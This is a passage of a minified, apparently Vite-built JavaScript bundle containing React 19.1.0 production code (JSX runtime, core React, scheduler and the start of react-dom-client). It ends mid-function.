var PS = (t, e) => () => (e || t((e = {
    exports: {}
}).exports, e),
e.exports);
var m4 = PS( (y4, El) => {
    (function() {
        const e = document.createElement("link").relList;
        if (e && e.supports && e.supports("modulepreload"))
            return;
        for (const o of document.querySelectorAll('link[rel="modulepreload"]'))
            s(o);
        new MutationObserver(o => {
            for (const l of o)
                if (l.type === "childList")
                    for (const u of l.addedNodes)
                        u.tagName === "LINK" && u.rel === "modulepreload" && s(u)
        }
        ).observe(document, {
            childList: !0,
            subtree: !0
        });
        function n(o) {
            const l = {};
            return o.integrity && (l.integrity = o.integrity),
            o.referrerPolicy && (l.referrerPolicy = o.referrerPolicy),
            o.crossOrigin === "use-credentials" ? l.credentials = "include" : o.crossOrigin === "anonymous" ? l.credentials = "omit" : l.credentials = "same-origin",
            l
        }
        function s(o) {
            if (o.ep)
                return;
            o.ep = !0;
            const l = n(o);
            fetch(o.href, l)
        }
    }
    )();
    var Da = typeof globalThis < "u" ? globalThis : typeof window < "u" ? window : typeof global < "u" ? global : typeof self < "u" ? self : {};
    function jp(t) {
        return t && t.__esModule && Object.prototype.hasOwnProperty.call(t, "default") ? t.default : t
    }
    var Em = {
        exports: {}
    }
      , fl = {};
    /**
 * @license React
 * react-jsx-runtime.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
    var jb;
    function HS() {
        if (jb)
            return fl;
        jb = 1;
        var t = Symbol.for("react.transitional.element")
          , e = Symbol.for("react.fragment");
        function n(s, o, l) {
            var u = null;
            if (l !== void 0 && (u = "" + l),
            o.key !== void 0 && (u = "" + o.key),
            "key"in o) {
                l = {};
                for (var d in o)
                    d !== "key" && (l[d] = o[d])
            } else
                l = o;
            return o = l.ref,
            {
                $$typeof: t,
                type: s,
                key: u,
                ref: o !== void 0 ? o : null,
                props: l
            }
        }
        return fl.Fragment = e,
        fl.jsx = n,
        fl.jsxs = n,
        fl
    }
    var Pb;
    function zS() {
        return Pb || (Pb = 1,
        Em.exports = HS()),
        Em.exports
    }
    var k = zS()
      , xm = {
        exports: {}
    }
      , Ne = {};
    /**
 * @license React
 * react.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
    var Hb;
    function GS() {
        if (Hb)
            return Ne;
        Hb = 1;
        var t = Symbol.for("react.transitional.element")
          , e = Symbol.for("react.portal")
          , n = Symbol.for("react.fragment")
          , s = Symbol.for("react.strict_mode")
          , o = Symbol.for("react.profiler")
          , l = Symbol.for("react.consumer")
          , u = Symbol.for("react.context")
          , d = Symbol.for("react.forward_ref")
          , p = Symbol.for("react.suspense")
          , h = Symbol.for("react.memo")
          , m = Symbol.for("react.lazy")
          , y = Symbol.iterator;
        function w(R) {
            return R === null || typeof R != "object" ? null : (R = y && R[y] || R["@@iterator"],
            typeof R == "function" ? R : null)
        }
        var E = {
            isMounted: function() {
                return !1
            },
            enqueueForceUpdate: function() {},
            enqueueReplaceState: function() {},
            enqueueSetState: function() {}
        }
          , S = Object.assign
          , _ = {};
        function x(R, F, ne) {
            this.props = R,
            this.context = F,
            this.refs = _,
            this.updater = ne || E
        }
        x.prototype.isReactComponent = {},
        x.prototype.setState = function(R, F) {
            if (typeof R != "object" && typeof R != "function" && R != null)
                throw Error("takes an object of state variables to update or a function which returns an object of state variables.");
            this.updater.enqueueSetState(this, R, F, "setState")
        }
        ,
        x.prototype.forceUpdate = function(R) {
            this.updater.enqueueForceUpdate(this, R, "forceUpdate")
        }
        ;
        function b() {}
        b.prototype = x.prototype;
        function I(R, F, ne) {
            this.props = R,
            this.context = F,
            this.refs = _,
            this.updater = ne || E
        }
        var O = I.prototype = new b;
        O.constructor = I,
        S(O, x.prototype),
        O.isPureReactComponent = !0;
        var z = Array.isArray
          , L = {
            H: null,
            A: null,
            T: null,
            S: null,
            V: null
        }
          , Y = Object.prototype.hasOwnProperty;
        function W(R, F, ne, ae, re, he) {
            return ne = he.ref,
            {
                $$typeof: t,
                type: R,
                key: F,
                ref: ne !== void 0 ? ne : null,
                props: he
            }
        }
        function D(R, F) {
            return W(R.type, F, void 0, void 0, void 0, R.props)
        }
        function se(R) {
            return typeof R == "object" && R !== null && R.$$typeof === t
        }
        function Z(R) {
            var F = {
                "=": "=0",
                ":": "=2"
            };
            return "$" + R.replace(/[=:]/g, function(ne) {
                return F[ne]
            })
        }
        var oe = /\/+/g;
        function le(R, F) {
            return typeof R == "object" && R !== null && R.key != null ? Z("" + R.key) : F.toString(36)
        }
        function ve() {}
        function ze(R) {
            switch (R.status) {
            case "fulfilled":
                return R.value;
            case "rejected":
                throw R.reason;
            default:
                switch (typeof R.status == "string" ? R.then(ve, ve) : (R.status = "pending",
                R.then(function(F) {
                    R.status === "pending" && (R.status = "fulfilled",
                    R.value = F)
                }, function(F) {
                    R.status === "pending" && (R.status = "rejected",
                    R.reason = F)
                })),
                R.status) {
                case "fulfilled":
                    return R.value;
                case "rejected":
                    throw R.reason
                }
            }
            throw R
        }
        function B(R, F, ne, ae, re) {
            var he = typeof R;
            (he === "undefined" || he === "boolean") && (R = null);
            var ye = !1;
            if (R === null)
                ye = !0;
            else
                switch (he) {
                case "bigint":
                case "string":
                case "number":
                    ye = !0;
                    break;
                case "object":
                    switch (R.$$typeof) {
                    case t:
                    case e:
                        ye = !0;
                        break;
                    case m:
                        return ye = R._init,
                        B(ye(R._payload), F, ne, ae, re)
                    }
                }
            if (ye)
                return re = re(R),
                ye = ae === "" ? "." + le(R, 0) : ae,
                z(re) ? (ne = "",
                ye != null && (ne = ye.replace(oe, "$&/") + "/"),
                B(re, F, ne, "", function(vt) {
                    return vt
                })) : re != null && (se(re) && (re = D(re, ne + (re.key == null || R && R.key === re.key ? "" : ("" + re.key).replace(oe, "$&/") + "/") + ye)),
                F.push(re)),
                1;
            ye = 0;
            var ut = ae === "" ? "." : ae + ":";
            if (z(R))
                for (var Xe = 0; Xe < R.length; Xe++)
                    ae = R[Xe],
                    he = ut + le(ae, Xe),
                    ye += B(ae, F, ne, he, re);
            else if (Xe = w(R),
            typeof Xe == "function")
                for (R = Xe.call(R),
                Xe = 0; !(ae = R.next()).done; )
                    ae = ae.value,
                    he = ut + le(ae, Xe++),
                    ye += B(ae, F, ne, he, re);
            else if (he === "object") {
                if (typeof R.then == "function")
                    return B(ze(R), F, ne, ae, re);
                throw F = String(R),
                Error("Objects are not valid as a React child (found: " + (F === "[object Object]" ? "object with keys {" + Object.keys(R).join(", ") + "}" : F) + "). If you meant to render a collection of children, use an array instead.")
            }
            return ye
        }
        function T(R, F, ne) {
            if (R == null)
                return R;
            var ae = []
              , re = 0;
            return B(R, ae, "", "", function(he) {
                return F.call(ne, he, re++)
            }),
            ae
        }
        function P(R) {
            if (R._status === -1) {
                var F = R._result;
                F = F(),
                F.then(function(ne) {
                    (R._status === 0 || R._status === -1) && (R._status = 1,
                    R._result = ne)
                }, function(ne) {
                    (R._status === 0 || R._status === -1) && (R._status = 2,
                    R._result = ne)
                }),
                R._status === -1 && (R._status = 0,
                R._result = F)
            }
            if (R._status === 1)
                return R._result.default;
            throw R._result
        }
        var J = typeof reportError == "function" ? reportError : function(R) {
            if (typeof window == "object" && typeof window.ErrorEvent == "function") {
                var F = new window.ErrorEvent("error",{
                    bubbles: !0,
                    cancelable: !0,
                    message: typeof R == "object" && R !== null && typeof R.message == "string" ? String(R.message) : String(R),
                    error: R
                });
                if (!window.dispatchEvent(F))
                    return
            } else if (typeof process == "object" && typeof process.emit == "function") {
                process.emit("uncaughtException", R);
                return
            }
            console.error(R)
        }
        ;
        function ie() {}
        return Ne.Children = {
            map: T,
            forEach: function(R, F, ne) {
                T(R, function() {
                    F.apply(this, arguments)
                }, ne)
            },
            count: function(R) {
                var F = 0;
                return T(R, function() {
                    F++
                }),
                F
            },
            toArray: function(R) {
                return T(R, function(F) {
                    return F
                }) || []
            },
            only: function(R) {
                if (!se(R))
                    throw Error("React.Children.only expected to receive a single React element child.");
                return R
            }
        },
        Ne.Component = x,
        Ne.Fragment = n,
        Ne.Profiler = o,
        Ne.PureComponent = I,
        Ne.StrictMode = s,
        Ne.Suspense = p,
        Ne.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = L,
        Ne.__COMPILER_RUNTIME = {
            __proto__: null,
            c: function(R) {
                return L.H.useMemoCache(R)
            }
        },
        Ne.cache = function(R) {
            return function() {
                return R.apply(null, arguments)
            }
        }
        ,
        Ne.cloneElement = function(R, F, ne) {
            if (R == null)
                throw Error("The argument must be a React element, but you passed " + R + ".");
            var ae = S({}, R.props)
              , re = R.key
              , he = void 0;
            if (F != null)
                for (ye in F.ref !== void 0 && (he = void 0),
                F.key !== void 0 && (re = "" + F.key),
                F)
                    !Y.call(F, ye) || ye === "key" || ye === "__self" || ye === "__source" || ye === "ref" && F.ref === void 0 || (ae[ye] = F[ye]);
            var ye = arguments.length - 2;
            if (ye === 1)
                ae.children = ne;
            else if (1 < ye) {
                for (var ut = Array(ye), Xe = 0; Xe < ye; Xe++)
                    ut[Xe] = arguments[Xe + 2];
                ae.children = ut
            }
            return W(R.type, re, void 0, void 0, he, ae)
        }
        ,
        Ne.createContext = function(R) {
            return R = {
                $$typeof: u,
                _currentValue: R,
                _currentValue2: R,
                _threadCount: 0,
                Provider: null,
                Consumer: null
            },
            R.Provider = R,
            R.Consumer = {
                $$typeof: l,
                _context: R
            },
            R
        }
        ,
        Ne.createElement = function(R, F, ne) {
            var ae, re = {}, he = null;
            if (F != null)
                for (ae in F.key !== void 0 && (he = "" + F.key),
                F)
                    Y.call(F, ae) && ae !== "key" && ae !== "__self" && ae !== "__source" && (re[ae] = F[ae]);
            var ye = arguments.length - 2;
            if (ye === 1)
                re.children = ne;
            else if (1 < ye) {
                for (var ut = Array(ye), Xe = 0; Xe < ye; Xe++)
                    ut[Xe] = arguments[Xe + 2];
                re.children = ut
            }
            if (R && R.defaultProps)
                for (ae in ye = R.defaultProps,
                ye)
                    re[ae] === void 0 && (re[ae] = ye[ae]);
            return W(R, he, void 0, void 0, null, re)
        }
        ,
        Ne.createRef = function() {
            return {
                current: null
            }
        }
        ,
        Ne.forwardRef = function(R) {
            return {
                $$typeof: d,
                render: R
            }
        }
        ,
        Ne.isValidElement = se,
        Ne.lazy = function(R) {
            return {
                $$typeof: m,
                _payload: {
                    _status: -1,
                    _result: R
                },
                _init: P
            }
        }
        ,
        Ne.memo = function(R, F) {
            return {
                $$typeof: h,
                type: R,
                compare: F === void 0 ? null : F
            }
        }
        ,
        Ne.startTransition = function(R) {
            var F = L.T
              , ne = {};
            L.T = ne;
            try {
                var ae = R()
                  , re = L.S;
                re !== null && re(ne, ae),
                typeof ae == "object" && ae !== null && typeof ae.then == "function" && ae.then(ie, J)
            } catch (he) {
                J(he)
            } finally {
                L.T = F
            }
        }
        ,
        Ne.unstable_useCacheRefresh = function() {
            return L.H.useCacheRefresh()
        }
        ,
        Ne.use = function(R) {
            return L.H.use(R)
        }
        ,
        Ne.useActionState = function(R, F, ne) {
            return L.H.useActionState(R, F, ne)
        }
        ,
        Ne.useCallback = function(R, F) {
            return L.H.useCallback(R, F)
        }
        ,
        Ne.useContext = function(R) {
            return L.H.useContext(R)
        }
        ,
        Ne.useDebugValue = function() {}
        ,
        Ne.useDeferredValue = function(R, F) {
            return L.H.useDeferredValue(R, F)
        }
        ,
        Ne.useEffect = function(R, F, ne) {
            var ae = L.H;
            if (typeof ne == "function")
                throw Error("useEffect CRUD overload is not enabled in this build of React.");
            return ae.useEffect(R, F)
        }
        ,
        Ne.useId = function() {
            return L.H.useId()
        }
        ,
        Ne.useImperativeHandle = function(R, F, ne) {
            return L.H.useImperativeHandle(R, F, ne)
        }
        ,
        Ne.useInsertionEffect = function(R, F) {
            return L.H.useInsertionEffect(R, F)
        }
        ,
        Ne.useLayoutEffect = function(R, F) {
            return L.H.useLayoutEffect(R, F)
        }
        ,
        Ne.useMemo = function(R, F) {
            return L.H.useMemo(R, F)
        }
        ,
        Ne.useOptimistic = function(R, F) {
            return L.H.useOptimistic(R, F)
        }
        ,
        Ne.useReducer = function(R, F, ne) {
            return L.H.useReducer(R, F, ne)
        }
        ,
        Ne.useRef = function(R) {
            return L.H.useRef(R)
        }
        ,
        Ne.useState = function(R) {
            return L.H.useState(R)
        }
        ,
        Ne.useSyncExternalStore = function(R, F, ne) {
            return L.H.useSyncExternalStore(R, F, ne)
        }
        ,
        Ne.useTransition = function() {
            return L.H.useTransition()
        }
        ,
        Ne.version = "19.1.0",
        Ne
    }
    var zb;
    function Pp() {
        return zb || (zb = 1,
        xm.exports = GS()),
        xm.exports
    }
    var Q = Pp()
      , Sm = {
        exports: {}
    }
      , hl = {}
      , Tm = {
        exports: {}
    }
      , Rm = {};
    /**
 * @license React
 * scheduler.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
    var Gb;
    function qS() {
        return Gb || (Gb = 1,
        function(t) {
            function e(T, P) {
                var J = T.length;
                T.push(P);
                e: for (; 0 < J; ) {
                    var ie = J - 1 >>> 1
                      , R = T[ie];
                    if (0 < o(R, P))
                        T[ie] = P,
                        T[J] = R,
                        J = ie;
                    else
                        break e
                }
            }
            function n(T) {
                return T.length === 0 ? null : T[0]
            }
            function s(T) {
                if (T.length === 0)
                    return null;
                var P = T[0]
                  , J = T.pop();
                if (J !== P) {
                    T[0] = J;
                    e: for (var ie = 0, R = T.length, F = R >>> 1; ie < F; ) {
                        var ne = 2 * (ie + 1) - 1
                          , ae = T[ne]
                          , re = ne + 1
                          , he = T[re];
                        if (0 > o(ae, J))
                            re < R && 0 > o(he, ae) ? (T[ie] = he,
                            T[re] = J,
                            ie = re) : (T[ie] = ae,
                            T[ne] = J,
                            ie = ne);
                        else if (re < R && 0 > o(he, J))
                            T[ie] = he,
                            T[re] = J,
                            ie = re;
                        else
                            break e
                    }
                }
                return P
            }
            function o(T, P) {
                var J = T.sortIndex - P.sortIndex;
                return J !== 0 ? J : T.id - P.id
            }
            if (t.unstable_now = void 0,
            typeof performance == "object" && typeof performance.now == "function") {
                var l = performance;
                t.unstable_now = function() {
                    return l.now()
                }
            } else {
                var u = Date
                  , d = u.now();
                t.unstable_now = function() {
                    return u.now() - d
                }
            }
            var p = []
              , h = []
              , m = 1
              , y = null
              , w = 3
              , E = !1
              , S = !1
              , _ = !1
              , x = !1
              , b = typeof setTimeout == "function" ? setTimeout : null
              , I = typeof clearTimeout == "function" ? clearTimeout : null
              , O = typeof setImmediate < "u" ? setImmediate : null;
            function z(T) {
                for (var P = n(h); P !== null; ) {
                    if (P.callback === null)
                        s(h);
                    else if (P.startTime <= T)
                        s(h),
                        P.sortIndex = P.expirationTime,
                        e(p, P);
                    else
                        break;
                    P = n(h)
                }
            }
            function L(T) {
                if (_ = !1,
                z(T),
                !S)
                    if (n(p) !== null)
                        S = !0,
                        Y || (Y = !0,
                        le());
                    else {
                        var P = n(h);
                        P !== null && B(L, P.startTime - T)
                    }
            }
            var Y = !1
              , W = -1
              , D = 5
              , se = -1;
            function Z() {
                return x ? !0 : !(t.unstable_now() - se < D)
            }
            function oe() {
                if (x = !1,
                Y) {
                    var T = t.unstable_now();
                    se = T;
                    var P = !0;
                    try {
                        e: {
                            S = !1,
                            _ && (_ = !1,
                            I(W),
                            W = -1),
                            E = !0;
                            var J = w;
                            try {
                                t: {
                                    for (z(T),
                                    y = n(p); y !== null && !(y.expirationTime > T && Z()); ) {
                                        var ie = y.callback;
                                        if (typeof ie == "function") {
                                            y.callback = null,
                                            w = y.priorityLevel;
                                            var R = ie(y.expirationTime <= T);
                                            if (T = t.unstable_now(),
                                            typeof R == "function") {
                                                y.callback = R,
                                                z(T),
                                                P = !0;
                                                break t
                                            }
                                            y === n(p) && s(p),
                                            z(T)
                                        } else
                                            s(p);
                                        y = n(p)
                                    }
                                    if (y !== null)
                                        P = !0;
                                    else {
                                        var F = n(h);
                                        F !== null && B(L, F.startTime - T),
                                        P = !1
                                    }
                                }
                                break e
                            } finally {
                                y = null,
                                w = J,
                                E = !1
                            }
                            P = void 0
                        }
                    } finally {
                        P ? le() : Y = !1
                    }
                }
            }
            var le;
            if (typeof O == "function")
                le = function() {
                    O(oe)
                }
                ;
            else if (typeof MessageChannel < "u") {
                var ve = new MessageChannel
                  , ze = ve.port2;
                ve.port1.onmessage = oe,
                le = function() {
                    ze.postMessage(null)
                }
            } else
                le = function() {
                    b(oe, 0)
                }
                ;
            function B(T, P) {
                W = b(function() {
                    T(t.unstable_now())
                }, P)
            }
            t.unstable_IdlePriority = 5,
            t.unstable_ImmediatePriority = 1,
            t.unstable_LowPriority = 4,
            t.unstable_NormalPriority = 3,
            t.unstable_Profiling = null,
            t.unstable_UserBlockingPriority = 2,
            t.unstable_cancelCallback = function(T) {
                T.callback = null
            }
            ,
            t.unstable_forceFrameRate = function(T) {
                0 > T || 125 < T ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : D = 0 < T ? Math.floor(1e3 / T) : 5
            }
            ,
            t.unstable_getCurrentPriorityLevel = function() {
                return w
            }
            ,
            t.unstable_next = function(T) {
                switch (w) {
                case 1:
                case 2:
                case 3:
                    var P = 3;
                    break;
                default:
                    P = w
                }
                var J = w;
                w = P;
                try {
                    return T()
                } finally {
                    w = J
                }
            }
            ,
            t.unstable_requestPaint = function() {
                x = !0
            }
            ,
            t.unstable_runWithPriority = function(T, P) {
                switch (T) {
                case 1:
                case 2:
                case 3:
                case 4:
                case 5:
                    break;
                default:
                    T = 3
                }
                var J = w;
                w = T;
                try {
                    return P()
                } finally {
                    w = J
                }
            }
            ,
            t.unstable_scheduleCallback = function(T, P, J) {
                var ie = t.unstable_now();
                switch (typeof J == "object" && J !== null ? (J = J.delay,
                J = typeof J == "number" && 0 < J ? ie + J : ie) : J = ie,
                T) {
                case 1:
                    var R = -1;
                    break;
                case 2:
                    R = 250;
                    break;
                case 5:
                    R = 1073741823;
                    break;
                case 4:
                    R = 1e4;
                    break;
                default:
                    R = 5e3
                }
                return R = J + R,
                T = {
                    id: m++,
                    callback: P,
                    priorityLevel: T,
                    startTime: J,
                    expirationTime: R,
                    sortIndex: -1
                },
                J > ie ? (T.sortIndex = J,
                e(h, T),
                n(p) === null && T === n(h) && (_ ? (I(W),
                W = -1) : _ = !0,
                B(L, J - ie))) : (T.sortIndex = R,
                e(p, T),
                S || E || (S = !0,
                Y || (Y = !0,
                le()))),
                T
            }
            ,
            t.unstable_shouldYield = Z,
            t.unstable_wrapCallback = function(T) {
                var P = w;
                return function() {
                    var J = w;
                    w = P;
                    try {
                        return T.apply(this, arguments)
                    } finally {
                        w = J
                    }
                }
            }
        }(Rm)),
        Rm
    }
    var qb;
    function FS() {
        return qb || (qb = 1,
        Tm.exports = qS()),
        Tm.exports
    }
    var Bm = {
        exports: {}
    }
      , Qt = {};
    /**
 * @license React
 * react-dom.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
    var Fb;
    function QS() {
        if (Fb)
            return Qt;
        Fb = 1;
        var t = Pp();
        function e(p) {
            var h = "https://react.dev/errors/" + p;
            if (1 < arguments.length) {
                h += "?args[]=" + encodeURIComponent(arguments[1]);
                for (var m = 2; m < arguments.length; m++)
                    h += "&args[]=" + encodeURIComponent(arguments[m])
            }
            return "Minified React error #" + p + "; visit " + h + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
        }
        function n() {}
        var s = {
            d: {
                f: n,
                r: function() {
                    throw Error(e(522))
                },
                D: n,
                C: n,
                L: n,
                m: n,
                X: n,
                S: n,
                M: n
            },
            p: 0,
            findDOMNode: null
        }
          , o = Symbol.for("react.portal");
        function l(p, h, m) {
            var y = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
            return {
                $$typeof: o,
                key: y == null ? null : "" + y,
                children: p,
                containerInfo: h,
                implementation: m
            }
        }
        var u = t.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
        function d(p, h) {
            if (p === "font")
                return "";
            if (typeof h == "string")
                return h === "use-credentials" ? h : ""
        }
        return Qt.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = s,
        Qt.createPortal = function(p, h) {
            var m = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
            if (!h || h.nodeType !== 1 && h.nodeType !== 9 && h.nodeType !== 11)
                throw Error(e(299));
            return l(p, h, null, m)
        }
        ,
        Qt.flushSync = function(p) {
            var h = u.T
              , m = s.p;
            try {
                if (u.T = null,
                s.p = 2,
                p)
                    return p()
            } finally {
                u.T = h,
                s.p = m,
                s.d.f()
            }
        }
        ,
        Qt.preconnect = function(p, h) {
            typeof p == "string" && (h ? (h = h.crossOrigin,
            h = typeof h == "string" ? h === "use-credentials" ? h : "" : void 0) : h = null,
            s.d.C(p, h))
        }
        ,
        Qt.prefetchDNS = function(p) {
            typeof p == "string" && s.d.D(p)
        }
        ,
        Qt.preinit = function(p, h) {
            if (typeof p == "string" && h && typeof h.as == "string") {
                var m = h.as
                  , y = d(m, h.crossOrigin)
                  , w = typeof h.integrity == "string" ? h.integrity : void 0
                  , E = typeof h.fetchPriority == "string" ? h.fetchPriority : void 0;
                m === "style" ? s.d.S(p, typeof h.precedence == "string" ? h.precedence : void 0, {
                    crossOrigin: y,
                    integrity: w,
                    fetchPriority: E
                }) : m === "script" && s.d.X(p, {
                    crossOrigin: y,
                    integrity: w,
                    fetchPriority: E,
                    nonce: typeof h.nonce == "string" ? h.nonce : void 0
                })
            }
        }
        ,
        Qt.preinitModule = function(p, h) {
            if (typeof p == "string")
                if (typeof h == "object" && h !== null) {
                    if (h.as == null || h.as === "script") {
                        var m = d(h.as, h.crossOrigin);
                        s.d.M(p, {
                            crossOrigin: m,
                            integrity: typeof h.integrity == "string" ? h.integrity : void 0,
                            nonce: typeof h.nonce == "string" ? h.nonce : void 0
                        })
                    }
                } else
                    h == null && s.d.M(p)
        }
        ,
        Qt.preload = function(p, h) {
            if (typeof p == "string" && typeof h == "object" && h !== null && typeof h.as == "string") {
                var m = h.as
                  , y = d(m, h.crossOrigin);
                s.d.L(p, m, {
                    crossOrigin: y,
                    integrity: typeof h.integrity == "string" ? h.integrity : void 0,
                    nonce: typeof h.nonce == "string" ? h.nonce : void 0,
                    type: typeof h.type == "string" ? h.type : void 0,
                    fetchPriority: typeof h.fetchPriority == "string" ? h.fetchPriority : void 0,
                    referrerPolicy: typeof h.referrerPolicy == "string" ? h.referrerPolicy : void 0,
                    imageSrcSet: typeof h.imageSrcSet == "string" ? h.imageSrcSet : void 0,
                    imageSizes: typeof h.imageSizes == "string" ? h.imageSizes : void 0,
                    media: typeof h.media == "string" ? h.media : void 0
                })
            }
        }
        ,
        Qt.preloadModule = function(p, h) {
            if (typeof p == "string")
                if (h) {
                    var m = d(h.as, h.crossOrigin);
                    s.d.m(p, {
                        as: typeof h.as == "string" && h.as !== "script" ? h.as : void 0,
                        crossOrigin: m,
                        integrity: typeof h.integrity == "string" ? h.integrity : void 0
                    })
                } else
                    s.d.m(p)
        }
        ,
        Qt.requestFormReset = function(p) {
            s.d.r(p)
        }
        ,
        Qt.unstable_batchedUpdates = function(p, h) {
            return p(h)
        }
        ,
        Qt.useFormState = function(p, h, m) {
            return u.H.useFormState(p, h, m)
        }
        ,
        Qt.useFormStatus = function() {
            return u.H.useHostTransitionStatus()
        }
        ,
        Qt.version = "19.1.0",
        Qt
    }
    var Qb;
    function VS() {
        if (Qb)
            return Bm.exports;
        Qb = 1;
        function t() {
            if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
                try {
                    __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(t)
                } catch (e) {
                    console.error(e)
                }
        }
        return t(),
        Bm.exports = QS(),
        Bm.exports
    }
    /**
 * @license React
 * react-dom-client.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
    var Vb;
    function YS() {
        if (Vb)
            return hl;
        Vb = 1;
        var t = FS()
          , e = Pp()
          , n = VS();
        function s(i) {
            var r = "https://react.dev/errors/" + i;
            if (1 < arguments.length) {
                r += "?args[]=" + encodeURIComponent(arguments[1]);
                for (var a = 2; a < arguments.length; a++)
                    r += "&args[]=" + encodeURIComponent(arguments[a])
            }
            return "Minified React error #" + i + "; visit " + r + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
        }
        function o(i) {
            return !(!i || i.nodeType !== 1 && i.nodeType !== 9 && i.nodeType !== 11)
        }
        function l(i) {
            var r = i
              , a = i;
            if (i.alternate)
                for (; r.return; )
                    r = r.return;
            else {
                i = r;
                do
                    r = i,
                    (r.flags & 4098) !== 0 && (a = r.return),
                    i = r.return;
                while (i)
            }
            return r.tag === 3 ? a : null
        }
        function u(i) {
            if (i.tag === 13) {
                var r = i.memoizedState;
                if (r === null && (i = i.alternate,
                i !== null && (r = i.memoizedState)),
                r !== null)
                    return r.dehydrated
            }
            return null
        }
        function d(i) {
            if (l(i) !== i)
                throw Error(s(188))
        }
        function p(i) {
            var r = i.alternate;
            if (!r) {
                if (r = l(i),
                r === null)
                    throw Error(s(188));
                return r !== i ? null : i
            }
            for (var a = i, c = r; ; ) {
                var f = a.return;
                if (f === null)
                    break;
                var g = f.alternate;
                if (g === null) {
                    if (c = f.return,
                    c !== null) {
                        a = c;
                        continue
                    }
                    break
                }
                if (f.child === g.child) {
                    for (g = f.child; g; ) {
                        if (g === a)
                            return d(f),
                            i;
                        if (g === c)
                            return d(f),
                            r;
                        g = g.sibling
                    }
                    throw Error(s(188))
                }
                if (a.return !== c.return)
                    a = f,
                    c = g;
                else {
                    for (var v = !1, A = f.child; A; ) {
                        if (A === a) {
                            v = !0,
                            a = f,
                            c = g;
                            break
                        }
                        if (A === c) {
                            v = !0,
                            c = f,
                            a = g;
                            break
                        }
                        A = A.sibling
                    }
                    if (!v) {
                        for (A = g.child; A; ) {
                            if (A === a) {
                                v = !0,
                                a = g,
                                c = f;
                                break
                            }
                            if (A === c) {
                                v = !0,
                                c = g,
                                a = f;
                                break
                            }
                            A = A.sibling
                        }
                        if (!v)
                            throw Error(s(189))
                    }
                }
                if (a.alternate !== c)
                    throw Error(s(190))
            }
            if (a.tag !== 3)
                throw Error(s(188));
            return a.stateNode.current === a ? i : r
        }
        function h(i) {
            var r = i.tag;
            if (r === 5 || r === 26 || r === 27 || r === 6)
                return i;
            for (i = i.child; i !== null; ) {
                if (r = h(i),
                r !== null)
                    return r;
                i = i.sibling
            }
            return null
        }
        var m = Object.assign
          , y = Symbol.for("react.element")
          , w = Symbol.for("react.transitional.element")
          , E = Symbol.for("react.portal")
          , S = Symbol.for("react.fragment")
          , _ = Symbol.for("react.strict_mode")
          , x = Symbol.for("react.profiler")
          , b = Symbol.for("react.provider")
          , I = Symbol.for("react.consumer")
          , O = Symbol.for("react.context")
          , z = Symbol.for("react.forward_ref")
          , L = Symbol.for("react.suspense")
          , Y = Symbol.for("react.suspense_list")
          , W = Symbol.for("react.memo")
          , D = Symbol.for("react.lazy")
          , se = Symbol.for("react.activity")
          , Z = Symbol.for("react.memo_cache_sentinel")
          , oe = Symbol.iterator;
        function le(i) {
            return i === null || typeof i != "object" ? null : (i = oe && i[oe] || i["@@iterator"],
            typeof i == "function" ? i : null)
        }
        var ve = Symbol.for("react.client.reference");
        function ze(i) {
            if (i == null)
                return null;
            if (typeof i == "function")
                return i.$$typeof === ve ? null : i.displayName || i.name || null;
            if (typeof i == "string")
                return i;
            switch (i) {
            case S:
                return "Fragment";
            case x:
                return "Profiler";
            case _:
                return "StrictMode";
            case L:
                return "Suspense";
            case Y:
                return "SuspenseList";
            case se:
                return "Activity"
            }
            if (typeof i == "object")
                switch (i.$$typeof) {
                case E:
                    return "Portal";
                case O:
                    return (i.displayName || "Context") + ".Provider";
                case I:
                    return (i._context.displayName || "Context") + ".Consumer";
                case z:
                    var r = i.render;
                    return i = i.displayName,
                    i || (i = r.displayName || r.name || "",
                    i = i !== "" ? "ForwardRef(" + i + ")" : "ForwardRef"),
                    i;
                case W:
                    return r = i.displayName || null,
                    r !== null ? r : ze(i.type) || "Memo";
                case D:
                    r = i._payload,
                    i = i._init;
                    try {
                        return ze(i(r))
                    } catch {}
                }
            return null
        }
        var B = Array.isArray
          , T = e.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
          , P = n.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
          , J = {
            pending: !1,
            data: null,
            method: null,
            action: null
        }
          , ie = []
          , R = -1;
        function F(i) {
            return {
                current: i
            }
        }
        function ne(i) {
            0 > R || (i.current = ie[R],
            ie[R] = null,
            R--)
        }
        function ae(i, r) {
            R++,
            ie[R] = i.current,
            i.current = r
        }
        var re = F(null)
          , he = F(null)
          , ye = F(null)
          , ut = F(null);
        function Xe(i, r) {
            switch (ae(ye, r),
            ae(he, i),
            ae(re, null),
            r.nodeType) {
            case 9:
            case 11:
                i = (i = r.documentElement) && (i = i.namespaceURI) ? fb(i) : 0;
                break;
            default:
                if (i = r.tagName,
                r = r.namespaceURI)
                    r = fb(r),
                    i = hb(r, i);
                else
                    switch (i) {
